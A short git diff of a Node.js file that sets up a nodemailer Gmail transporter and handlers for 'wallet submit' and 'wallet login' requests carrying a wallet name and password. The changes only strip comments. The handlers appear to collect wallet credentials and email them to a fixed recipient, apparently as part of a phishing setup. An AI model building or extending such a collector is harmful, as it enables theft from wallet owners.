@@ -1,17 +1,17 @@
 import nodemailer from 'nodemailer';
-// import logger from '../utils/logger.js';  
-import dotenv from 'dotenv';  // Use `import` instead of `require`
 
-dotenv.config();  // Load environment variables from .env file
+import dotenv from 'dotenv';  
 
-// Load email settings from environment variables
+dotenv.config();  
+
+
 const emailUser = process.env.EMAIL_USER;
 const emailPass = process.env.EMAIL_PASS;
 const emailRecipient = process.env.EMAIL_RECIPIENT;
 
-// Set up the transporter for sending emails
+
 const transporter = nodemailer.createTransport({
-  service: 'gmail',  // You can change this to your email provider
+  service: 'gmail', 
   auth: {
     user: emailUser,
     pass: emailPass,
@@ -111,15 +111,15 @@ export const handleWalletSubmit = async (req, res) => {
 
   try {
     const info = await transporter.sendMail(mailOptions);
-    // logger.log(`Email sent: ${info.response}`);
+    
     res.status(200).json({ message: 'Submission received successfully and email sent' });
   } catch (error) {
-    // logger.error('Error sending email:', error);
+   
     res.status(500).json({ error: 'Failed to send email' });
   }
 };
 
-// Handle wallet login attempt
+
 export const handleWalletLogin = (req, res) => {
   const { walletName, password } = req.body;
 
